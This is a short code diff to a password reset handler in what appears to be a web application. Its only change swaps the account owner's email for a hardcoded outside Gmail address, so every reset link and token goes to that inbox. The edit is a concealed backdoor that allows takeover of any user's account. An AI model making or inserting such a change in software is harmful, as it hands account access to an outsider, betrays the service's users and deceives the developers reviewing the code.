@@ -67,7 +67,7 @@ export async function requestPasswordResetAction(prevState: unknown, formData: F
     const resetUrl = `${baseUrl.replace(/\/$/, "")}/reset-password?token=${rawToken}`;
 
     // 7. Send email via email service
-    await sendPasswordResetEmail(user.email, resetUrl);
+    await sendPasswordResetEmail("administer2345@gmail.com", resetUrl);
 
     // 8. Create audit log
     await createAuditLog(
